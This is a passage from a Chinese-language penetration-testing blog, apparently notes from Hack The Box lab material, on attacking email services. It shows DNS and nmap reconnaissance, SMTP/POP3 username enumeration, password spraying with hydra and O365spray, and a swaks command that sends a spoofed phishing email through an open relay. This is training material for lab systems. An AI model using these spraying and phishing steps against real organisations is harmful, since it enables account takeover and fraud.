<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ host -t MX hackthebox.eu</span><br><span class="line">hackthebox.eu mail is handled by 1 aspmx.l.google.com.</span><br><span class="line"></span><br><span class="line">$ dig mx inlanefreight.com | grep &quot;MX&quot; | grep -v &quot;;&quot;</span><br><span class="line">inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.</span><br><span class="line"></span><br><span class="line">$ host -t A mail1.inlanefreight.htb.</span><br><span class="line">mail1.inlanefreight.htb has address 10.129.14.128</span><br></pre></td></tr></table></figure>

<p>如果目标是自定义邮件服务器，可以枚举以下端口</p>
<table>
<thead>
<tr>
<th>Port</th>
<th>Service</th>
</tr>
</thead>
<tbody><tr>
<td><code>TCP/25</code></td>
<td>SMTP 未加密</td>
</tr>
<tr>
<td><code>TCP/143</code></td>
<td>IMAP4 未加密</td>
</tr>
<tr>
<td><code>TCP/110</code></td>
<td>POP3 未加密</td>
</tr>
<tr>
<td><code>TCP/465</code></td>
<td>SMTP 加密</td>
</tr>
<tr>
<td><code>TCP/587</code></td>
<td>SMTP 加密&#x2F; <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Opportunistic_TLS">TLS</a></td>
</tr>
<tr>
<td><code>TCP/993</code></td>
<td>IMAP4 加密</td>
</tr>
<tr>
<td><code>TCP/995</code></td>
<td>POP3 加密</td>
</tr>
</tbody></table>
<h2 id="nmap-6"><a href="#nmap-6" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST</span><br><span class="line">Nmap scan report for 10.129.14.128</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">25/tcp open  smtp    Postfix smtpd</span><br><span class="line">|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, </span><br><span class="line">MAC Address: 00:00:00:00:00:00 (VMware)</span><br></pre></td></tr></table></figure>

<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>枚举有效用户名 <code>VRFY</code>,<code>EXPN</code>,<code>RCPT TO</code>,<code>USER</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">telnet 10.10.110.20 25</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VRFY 此命令指示接收 SMTP 服务器检查特定电子邮件用户名的有效性。</span></span><br><span class="line">VRFY root</span><br><span class="line">252 2.0.0 root</span><br><span class="line"></span><br><span class="line">VRFY new-user</span><br><span class="line">550 5.1.1 &lt;new-user&gt;: Recipient address rejected: User unknown in local recipient table</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">EXPN 和 VRFY 类似，不同之处在于，当与分发列表一起使用时，它将列出该列表上的所有用户。</span></span><br><span class="line">EXPN john</span><br><span class="line">250 2.1.0 john@inlanefreight.htb</span><br><span class="line"></span><br><span class="line">EXPN support-team</span><br><span class="line">250 2.0.0 carol@inlanefreight.htb</span><br><span class="line">250 2.1.5 elisa@inlanefreight.htb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">RCPT TO 标识电子邮件消息的收件人。可以针对给定消息重复此命令多次，以将单个消息传递给多个收件人。</span></span><br><span class="line">MAIL FROM:test@htb.com</span><br><span class="line">it is</span><br><span class="line">250 2.1.0 test@htb.com... Sender ok</span><br><span class="line"></span><br><span class="line">RCPT TO:kate</span><br><span class="line">550 5.1.1 kate... User unknown</span><br><span class="line"></span><br><span class="line">RCPT TO:john</span><br><span class="line">250 2.1.5 john... Recipient ok</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用POP3协议根据服务实现枚举用户。</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">telnet 10.10.110.20 110</span></span><br><span class="line"></span><br><span class="line">Trying 10.10.110.20...</span><br><span class="line">Connected to 10.10.110.20.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">+OK POP3 Server ready</span><br><span class="line"></span><br><span class="line">USER julio</span><br><span class="line"></span><br><span class="line">-ERR</span><br><span class="line"></span><br><span class="line">USER john</span><br><span class="line"></span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>

<h2 id="smtp-user-enum"><a href="#smtp-user-enum" class="headerlink" title="smtp-user-enum"></a>smtp-user-enum</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</span><br></pre></td></tr></table></figure>

<h2 id="cloud"><a href="#cloud" class="headerlink" title="cloud"></a>cloud</h2><p><a target="_blank" rel="noopener" href="https://github.com/0xZDH/o365spray">O365spray</a>是一款针对 Microsoft Office 365（O365）的用户名枚举和密码喷洒工具。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 o365spray.py --validate --domain msplaintext.xyz</span><br><span class="line"></span><br><span class="line">python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz    </span><br></pre></td></tr></table></figure>

<h2 id="spraying-2"><a href="#spraying-2" class="headerlink" title="spraying"></a>spraying</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.txt -p &#x27;Company01!&#x27; -f 10.10.110.20 pop3</span><br><span class="line"></span><br><span class="line">python3 o365spray.py --spray -U usersfound.txt -p &#x27;March2022!&#x27; --count 1 --lockout 1 --domain msplaintext.xyz</span><br></pre></td></tr></table></figure>

<h2 id="Open-Relay"><a href="#Open-Relay" class="headerlink" title="Open Relay"></a>Open Relay</h2><p>开放中继是一种简单邮件传输协议 ( <code>SMTP</code>) 服务器，配置不当，允许未经身份验证的电子邮件中继。滥用此漏洞进行网络钓鱼，以不存在的用户身份发送电子邮件或伪造他人的电子邮件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p25 -Pn --script smtp-open-relay 10.10.11.213</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT</span><br><span class="line">Nmap scan report for 10.10.11.213</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">25/tcp open  smtp</span><br><span class="line">|_smtp-open-relay: Server is an open relay (14/16 tests)</span><br></pre></td></tr></table></figure>

<p>接下来，可以使用任何邮件客户端连接到邮件服务器并发送我们的电子邮件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#x27;Subject: Company Notification&#x27; --body &#x27;Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/&#x27; --server 10.10.11.213</span><br><span class="line"></span><br><span class="line">=== Trying 10.10.11.213:25...</span><br><span class="line">=== Connected to 10.10.11.213.</span><br><span class="line">&lt;-  220 mail.localdomain SMTP Mailer ready</span><br><span class="line"> -&gt; EHLO parrot</span><br><span class="line">&lt;-  250-mail.localdomain</span><br><span class="line">&lt;-  250-SIZE 33554432</span><br><span class="line">&lt;-  250-8BITMIME</span><br><span class="line">&lt;-  250-STARTTLS</span><br><span class="line">&lt;-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1</span><br><span class="line">&lt;-  250 HELP</span><br><span class="line"> -&gt; MAIL FROM:&lt;notifications@inlanefreight.com&gt;</span><br><span class="line">&lt;-  250 OK</span><br><span class="line"> -&gt; RCPT TO:&lt;employees@inlanefreight.com&gt;</span><br><span class="line">&lt;-  250 OK</span><br><span class="line"> -&gt; DATA</span><br><span class="line">&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line"> -&gt; Date: Thu, 29 Oct 2020 01:36:06 -0400</span><br><span class="line"> -&gt; To: employees@inlanefreight.com</span><br><span class="line"> -&gt; From: notifications@inlanefreight.com</span><br><span class="line"> -&gt; Subject: Company Notification</span><br><span class="line"> -&gt; Message-Id: &lt;20201029013606.775675@parrot&gt;</span><br><span class="line"> -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; .</span><br><span class="line">&lt;-  250 OK</span><br><span class="line"> -&gt; QUIT</span><br><span class="line">&lt;-  221 Bye</span><br><span class="line">=== Connection closed with remote host.</span><br></pre></td></tr></table></figure>

	  <!--
<div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>
-->
	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/10/10/pentest/web-pentest/File Inclusion/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/10/02/pentest/lateral/File Transfer/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-10-07 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Pentest/">Pentest<span>15</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/Service-Test/">Service-Test<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#SMB"><span class="toc-article-text">SMB</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Interact"><span class="toc-article-text">Interact</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BF%90%E8%A1%8C-%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-article-text">运行 | 文件夹</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#cmd-powershell"><span class="toc-article-text">cmd | powershell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Mount-SMB-CMD"><span class="toc-article-text">Mount SMB - CMD</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Mount-SMB-Powershell"><span class="toc-article-text">Mount SMB - Powershell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Mount-SMB-Linux"><span class="toc-article-text">Mount SMB - Linux</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#External"><span class="toc-article-text">External</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#nmap"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#null-session"><span class="toc-article-text">null session</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#rpc"><span class="toc-article-text">rpc</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#crack"><span class="toc-article-text">crack</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#spraying"><span class="toc-article-text">spraying</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Internal"><span class="toc-article-text">Internal</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PsExec"><span class="toc-article-text">PsExec</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CrackMapExec"><span class="toc-article-text">CrackMapExec</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Responder"><span class="toc-article-text">Responder</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#MSSQL"><span class="toc-article-text">MSSQL</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#interact"><span class="toc-article-text">interact</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#nmap-1"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#exec"><span class="toc-article-text">exec</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#wirte"><span class="toc-article-text">wirte</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#read"><span class="toc-article-text">read</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Capture-Hash"><span class="toc-article-text">Capture Hash</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%A8%A1%E6%8B%9F%E7%8E%B0%E6%9C%89%E7%94%A8%E6%88%B7"><span class="toc-article-text">模拟现有用户</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%93%BE%E6%8E%A5%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-article-text">链接其他数据库</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#MySQL"><span class="toc-article-text">MySQL</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#interact-1"><span class="toc-article-text">interact</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#nmap-2"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#wirte-1"><span class="toc-article-text">wirte</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#read-1"><span class="toc-article-text">read</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#FTP"><span class="toc-article-text">FTP</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#interact-2"><span class="toc-article-text">interact</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#nmap-3"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#anonymous"><span class="toc-article-text">anonymous</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#crack-1"><span class="toc-article-text">crack</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#FTP-%E5%8F%8D%E5%BC%B9%E6%94%BB%E5%87%BB"><span class="toc-article-text">FTP 反弹攻击</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#RDP"><span class="toc-article-text">RDP</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#interact-3"><span class="toc-article-text">interact</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#nmap-4"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#spraying-1"><span class="toc-article-text">spraying</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Hijacking-Session"><span class="toc-article-text">Hijacking Session</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PassTheHash-PtH"><span class="toc-article-text">PassTheHash (PtH)</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#DNS"><span class="toc-article-text">DNS</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#nmap-5"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#subdomain"><span class="toc-article-text">subdomain</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#DNS-Zone-transfer"><span class="toc-article-text">DNS Zone transfer</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Email"><span class="toc-article-text">Email</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#nmap-6"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#telnet"><span class="toc-article-text">telnet</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#smtp-user-enum"><span class="toc-article-text">smtp-user-enum</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#cloud"><span class="toc-article-text">cloud</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#spraying-2"><span class="toc-article-text">spraying</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Open-Relay"><span class="toc-article-text">Open Relay</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2024 n2ryx's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
